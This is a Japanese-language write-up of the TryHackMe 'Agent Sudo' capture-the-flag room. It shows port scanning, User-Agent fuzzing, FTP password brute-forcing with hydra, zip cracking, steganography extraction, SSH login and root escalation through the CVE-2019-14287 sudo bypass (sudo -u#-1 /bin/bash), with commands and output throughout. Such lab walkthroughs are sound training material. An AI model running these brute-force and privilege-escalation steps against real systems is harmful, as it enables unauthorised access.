# Agent Sudo CTF

https://tryhackme.com/room/agentsudoctf

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.15.161
root@ip-10-10-67-168:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-23 01:34 GMT
Nmap scan report for 10.10.15.161
Host is up (0.023s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:C0:D0:FB:8D:F5 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 11.49 seconds
root@ip-10-10-67-168:~# sudo nmap -sV -p21,22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-23 01:34 GMT
Nmap scan report for 10.10.15.161
Host is up (0.0080s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 02:C0:D0:FB:8D:F5 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### gobuster

```shell
root@ip-10-10-67-168:~# gobuster dir -x=txt,php -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.15.161
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 218]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

## ホームページ

```text
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 
```

User-Agent にコードネームを設定する必要があるが、コードネームが分からない。

ffufを試したがヒットせず。

```shell
$ ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -X GET -H "User-Agent: FUZZ" -u http://10.10.15.161 -fr "Use your own"                                          

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.15.161
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Usernames/Names/names.txt
 :: Header           : User-Agent: FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Use your own
________________________________________________

:: Progress: [10177/10177] :: Job [1/1] :: 160 req/sec :: Duration: [0:01:13] :: Errors: 0 ::
```

ヒントに「User-Agent: C」でやってみろと書いてあった。  
302でリダイレクトされていた。

```http
HTTP/1.1 302 Found
Date: Sun, 23 Feb 2025 01:56:19 GMT
Server: Apache/2.4.29 (Ubuntu)
Location: agent_C_attention.php
Content-Length: 218
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<!DocType html>
<html>
<head>
	<title>Annoucement</title>
</head>

<body>
<p>
	Dear agents,
	<br><br>
	Use your own <b>codename</b> as user-agent to access the site.
	<br><br>
	From,<br>
	Agent R
</p>
</body>
</html>
```

/agent_C_attention.php

```text
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R 
```

「User-Agent: J」ではリダイレクトされなかった。

## FTP

ブルートフォース

```shell
$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.15.161 ftp -t 30
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-22 21:02:24
[DATA] max 30 tasks per 1 server, overall 30 tasks, 14344399 login tries (l:1/p:14344399), ~478147 tries per task
[DATA] attacking ftp://10.10.15.161:21/
[21][ftp] host: 10.10.15.161   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-22 21:03:06
```

chris / crystal でログインできる。

```shell
ftp> ls -al
229 Entering Extended Passive Mode (|||47850|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Oct 29  2019 .
drwxr-xr-x    2 0        0            4096 Oct 29  2019 ..
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
```

To_agentJ.txt

```text
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

```shell
$ exiftool ./cutie.png     
ExifTool Version Number         : 12.76
File Name                       : cutie.png
Directory                       : .
File Size                       : 35 kB
File Modification Date/Time     : 2019:10:29 08:33:51-04:00
File Access Date/Time           : 2025:02:22 21:05:10-05:00
File Inode Change Date/Time     : 2025:02:22 21:05:10-05:00
File Permissions                : -rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 528
Image Height                    : 528
Bit Depth                       : 8
Color Type                      : Palette
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Palette                         : (Binary data 762 bytes, use -b option to extract)
Transparency                    : (Binary data 42 bytes, use -b option to extract)
Warning                         : [minor] Trailer data after PNG IEND chunk
Image Size                      : 528x528
Megapixels                      : 0.279
```

pngの後ろにデータがある。  
binwalkで展開。

```shell
$ binwalk -Me ./cutie.png  
/usr/lib/python3/dist-packages/binwalk/core/magic.py:431: SyntaxWarning: invalid escape sequence '\.'
  self.period = re.compile("\.")

Scan Time:     2025-02-22 21:12:39
Target File:   /home/kali/CTF/cutie.png
MD5 Checksum:  7d0590aebd5dbcfe440c185160c73c9e
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22


Scan Time:     2025-02-22 21:12:41
Target File:   /home/kali/CTF/_cutie.png.extracted/365
MD5 Checksum:  1e7ac52e2601e6722fda312938ab2c1d
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
```

```shell
┌──(kali㉿kali)-[~/CTF/_cutie.png.extracted]
└─$ ls                         
365  365.zlib  8702.zip
```

zipのパスワードをブルートフォース

```shell
$ zip2john ./8702.zip > hash.txt

$ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 SSE2 4x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE (2025-02-22 21:19) 1.298g/s 31916p/s 31916c/s 31916C/s michael!..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

パスワードを使ってzipを展開

```shell
$ 7z x ./8702.zip
```

```shell
$ cat To_agentR.txt           
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

```shell
$ echo QXJlYTUx | base64 -d                
Area51
```

パスワードを使ってsteghideで展開

```shell
$ steghide --extract -sf ./cute-alien.jpg
Enter passphrase: 
wrote extracted data to "message.txt".
                                                                $ cat message.txt  
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

このパスワードを使ってSSHでログインできる。

## SSH

```shell
james@agent-sudo:~$ ls -al
total 80
drwxr-xr-x 4 james james  4096 Oct 29  2019 .
drwxr-xr-x 3 root  root   4096 Oct 29  2019 ..
-rw-r--r-- 1 james james 42189 Jun 19  2019 Alien_autospy.jpg
-rw------- 1 root  root    566 Oct 29  2019 .bash_history
-rw-r--r-- 1 james james   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 james james  3771 Apr  4  2018 .bashrc
drwx------ 2 james james  4096 Oct 29  2019 .cache
drwx------ 3 james james  4096 Oct 29  2019 .gnupg
-rw-r--r-- 1 james james   807 Apr  4  2018 .profile
-rw-r--r-- 1 james james     0 Oct 29  2019 .sudo_as_admin_successful
-rw-r--r-- 1 james james    33 Oct 29  2019 user_flag.txt

james@agent-sudo:~$ cat user_flag.txt
b0...............
```

## 権限昇格

```shell
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

### CVE-2019-14287

```shell
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# whoami
root
root@agent-sudo:~# ls /root
root.txt
root@agent-sudo:~# cat /root/root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53.............

By,
DesKel a.k.a Agent R
```

## 振り返り

- 初心者向けだがいろんな要素が詰まっていて楽しいCTF

## Tags

#tags:CVE-2019-14287 #tags:ツール脆弱性 #tags:sudo脆弱性
